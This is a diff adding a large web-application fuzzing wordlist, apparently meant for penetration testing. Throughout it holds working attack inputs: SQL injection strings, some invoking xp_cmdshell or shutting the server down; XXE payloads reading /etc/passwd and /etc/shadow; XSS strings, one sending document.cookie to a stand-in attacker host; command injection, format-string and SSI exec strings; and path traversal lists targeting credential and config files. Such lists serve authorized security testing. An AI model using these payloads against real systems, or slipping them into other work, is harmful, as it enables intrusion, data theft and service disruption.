@@ -1,0 +1,709 @@
+= ;
+= --
+\x23
+\x27
+\x3D \x3B'
+\x3D \x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or select *
+admin'--
+';shutdown--
+<>"'%;)(&+
+' or ''='
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+'
+'--
+' or 1=1--
+1 or 1=1--
+' or 1 in (@@version)--
+1 or 1 in (@@version)--
+'; waitfor delay '0:30:0'--
+1; waitfor delay '0:30:0'--
+'||Utl_Http.request('http://<yourservername>') from dual--
+1||Utl_Http.request('http://<yourservername>') from dual--
+xsstest
+xsstest%00"<>'
+</foo>
+<foo></foo>
+))))))))))
+../../../../../../../../../../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+../../../../../../../../../../windows/win.ini
+..\..\..\..\..\..\..\..\..\..\windows\win.ini
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+| ping -i 30 127.0.0.1 |
+| ping -n 30 127.0.0.1 |
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+; ping 127.0.0.1 ;
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+;echo 111111
+echo 111111
+response.write 111111
+:response.write 111111
+http://<yourservername>/
+<youremail>%0aCc:<youremail>
+<youremail>%0d%0aCc:<youremail>
+<youremail>%0aBcc:<youremail>
+<youremail>%0d%0aBcc:<youremail>
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+# known cross platform source Code, file disclosure attack patterns - append after file or dir path
+%70
+.%E2%73%70
+%2e0
+%2e
+.
+\
+?*
+%20
+%00
+%2f
+%5c
+count(/child::node())
+x' or name()='username' or 'x'='y
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+%00
+NULL
+null
+'
+"
+;
+<!
+-
+=
++
+"
+&
+!
+|
+<
+>
+"><script>alert(1)</script>
+%0d
+%0a
+%7f
+%ff
+-1
+other
+%s%p%x%d
+%99999999999s
+%08x
+%20d
+%20n
+%20x
+%20s
+%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d
+%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i
+%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o
+%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
+%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a
+%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A
+%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e
+%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E
+%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f
+%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F
+%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g
+%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+XXXXX.%p
+XXXXX`perl -e 'print ".%p" x 80'`
+`perl -e 'print ".%p" x 80'`%n
+# a wide sample of malicious input for unix-like targets
+!
+!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+!@#0%^#0##018387@#0^^**(()
+"
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1--
+"' or 1 --'"
+") or ("a"="a
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"><script>"
+"><script>alert(1)</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+">xxx<P>yyy
+"\t"
+#
+#&apos;
+#'
+#xA
+#xA#xD
+#xD
+#xD#xA
+$NULL
+$null
+%
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+%00
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+%00/
+%00/etc/passwd%00
+%01%02%03%04%0a%0d%0aADSF
+%08x
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0Aid
+%0Aid%0A
+%0a ping -i 30 127.0.0.1 %0a
+%oa ping -n 30 127.0.0.1 %0a
+%0a id %0a
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+%0d
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+%0d%0aX-Injection-Header:%20AttackValue
+%20
+%20$(sleep%2050)
+%20'sleep%2050'
+%20d
+%20n
+%20s
+%20x
+%20|
+%21
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%2500
+%250a
+%26
+%27%20or%201=1
+%28
+%29
+%2A
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%2C
+%2e%2e%2f
+%3C
+%3C%3F
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert("XSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%5C
+%5C/
+%60
+%7C
+%7f
+%99999999999s
+%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A
+%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E
+%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F
+%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G
+%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
+%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a
+%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d
+%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e
+%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f
+%ff
+%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g
+%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i
+%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%s%p%x%d
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+&
+& id
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+&#0000060
+&#0000060;
+&#000060
+&#000060;
+&#00060
+&#00060;
+&#0060
+&#0060;
+&#060
+&#060;
+&#10;
+&#10;&#13;
+&#13;
+&#13;&#10;
+&#60
+&#60;
+&#X000003C
+&#X000003C;
+&#X000003c
+&#X000003c;
+&#X00003C
+&#X00003C;
+&#X00003c
+&#X00003c;
+&#X0003C
+&#X0003C;
+&#X0003c
+&#X0003c;
+&#X003C
+&#X003C;
+&#X003c
+&#X003c;
+&#X03C
+&#X03C;
+&#X03c
+&#X03c;
+&#X3C
+&#X3C;
+&#X3c
+&#X3c;
+&#x000003C
+&#x000003C;
+&#x000003c
+&#x000003c;
+&#x00003C
+&#x00003C;
+&#x00003c
+&#x00003c;
+&#x0003C
+&#x0003C;
+&#x0003c
+&#x0003c;
+&#x003C
+&#x003C;
+&#x003c
+&#x003c;
+&#x03C
+&#x03C;
+&#x03c
+&#x03c;
+&#x3C
+&#x3C;
+&#x3c
+&#x3c;
+&LT
+&LT;
+&apos;
+&apos;%20OR
+&id
+&lt
+&lt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;&gt;&quot;'%;)(&amp;+
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);</script>
+&quot;;id&quot;
+'
+' (select top 1
+' --
+' ;
+' UNION ALL SELECT
+' UNION SELECT
+' or ''='
+' or '1'='1
+' or '1'='1'--
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 1 in (@@version)--
+' or 1=1 or ''='
+' or 1=1--
+' or a=a--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+'%20or%201=1
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+'';!--"<XSS>=&{()}
+') or ('a'='a
+'--
+'; exec master..xp_cmdshell
+'; exec xp_regread
+'; waitfor delay '0:30:0'--
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+';shutdown--
+'><script>alert(document.cookie);</script>
+'><script>alert(document.cookie)</script>
+'hi' or 'x'='x';
+'or select *
+'sqlattempt1
+'||UTL_HTTP.REQUEST
+'||Utl_Http.request('http://<yourservername>') from dual--
+(
+/.../.../.../.../.../
+\…..\\\…..\\\…..\\\
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/../../../../../../../../%2A
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+=3D “/..” . “%2f..
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+admin/access_log
+/admin/install.php
+../../../administrator/inbox
+/apache2/logs/access_log
+/apache2/logs/access.log
+/apache2/logs/error_log
+/apache2/logs/error.log
+/apache/logs/access_log
+/apache/logs/access.log
+../../../../../apache/logs/access.log
+../../../../apache/logs/access.log
+../../../apache/logs/access.log
+../../apache/logs/access.log
+../apache/logs/access.log
+/apache/logs/error_log
+/apache/logs/error.log
+../../../../../apache/logs/error.log
+../../../../apache/logs/error.log
+../../../apache/logs/error.log
+../../apache/logs/error.log
+../apache/logs/error.log
+/apache\php\php.ini
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+/.bash_history
+/.bash_profile
+/.bashrc
+/../../../../../../../../bin/id|
+/bin/php.ini
+/boot/grub/grub.conf
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+..//..//..//..//..//boot.ini
+../../../../../../../../../../../../boot.ini
+../../boot.ini
+..\../..\../..\../..\../boot.ini
+..\../..\../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+c:\apache\logs\access.log
+c:\apache\logs\error.log
+c:\AppServ\MySQL
+C:/boot.ini
+C:\boot.ini
+/C:/inetpub/ftproot/
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+c:\inetpub\wwwroot\index.asp
+/config.asp
+../config.asp
+config.asp
+../config.inc.php
+config.inc.php
+../config.js
+config.js
+_config.php
+../_config.php
+../config.php
+config.php
+../_config.php%00
+../../../../../../../../conf/server.xml
+/core/config.php
+/C:\Program Files\
+c:\Program Files\Apache Group\Apache\logs\access.log
+c:\Program Files\Apache Group\Apache\logs\error.log
+/.cshrc
+c:\System32\Inetsrv\metabase.xml
+c:WINDOWS/system32/
+d:\AppServ\MySQL
+database.asp
+database.js
+database.php
+data.php
+dbase.php a
+db.php
+../../../../../../../dev
+/D:\Program Files\
+d:\System32\Inetsrv\metabase.xml
+/etc/apache2/apache2.conf
+/etc/apache2/conf/httpd.conf
+/etc/apache2/httpd.conf
+/etc/apache2/sites-available/default
+/etc/apache2/vhosts.d/default_vhost.include
+/etc/apache/apache.conf
+/etc/apache/conf/httpd.conf
+/etc/apache/httpd.conf
+/etc/apt/sources.list
+/etc/chrootUsers
+/etc/crontab
+/etc/defaultdomain
+/etc/default/passwd
+/etc/defaultrouter
+/etc/fstab
+/etc/ftpchroot
+/etc/ftphosts
+/etc/group
+/etc/hostname.bge
+/etc/hostname.ce0
+/etc/hostname.ce1
+/etc/hostname.ce2
+/etc/hostname.ce3
+/etc/hostname.dcelx0
+/etc/hostname.dcelx1
+/etc/hostname.dcelx2
+/etc/hostname.dcelx3
+/etc/hostname.dmfe0
+/etc/hostname.dmfe1
+/etc/hostname.dmfe2
+/etc/hostname.dmfe3
+/etc/hostname.dnet0
+/etc/hostname.dnet1
+/etc/hostname.dnet2
+/etc/hostname.dnet3
+/etc/hostname.ecn0
+/etc/hostname.ecn1
+/etc/hostname.ecn2
+/etc/hostname.ecn3
+/etc/hostname.elx0
+/etc/hostname.elx1
+/etc/hostname.elx2
+/etc/hostname.elx3
+/etc/hostname.elxl0
+/etc/hostname.elxl1
+/etc/hostname.elxl2
+/etc/hostname.elxl3
+/etc/hostname.eri0
+/etc/hostname.eri1
+/etc/hostname.eri2
+/etc/hostname.eri3
+/etc/hostname.ge0
+/etc/hostname.ge1
+/etc/hostname.ge2
+/etc/hostname.ge3
+/etc/hostname.hme0
+/etc/hostname.hme1
+/etc/hostname.hme2
+/etc/hostname.hme3
+/etc/hostname.ieef0
+/etc/hostname.ieef1
+/etc/hostname.ieef2
+/etc/hostname.ieef3
+/etc/hostname.iprb0
+/etc/hostname.iprb1
+/etc/hostname.iprb2
+/etc/hostname.iprb3
+/etc/hostname.le0
+/etc/hostname.le1
+/etc/hostname.le2
+/etc/hostname.le3
+/etc/hostname.lo
+/etc/hostname.pcn0
+/etc/hostname.pcn1
+/etc/hostname.pcn2
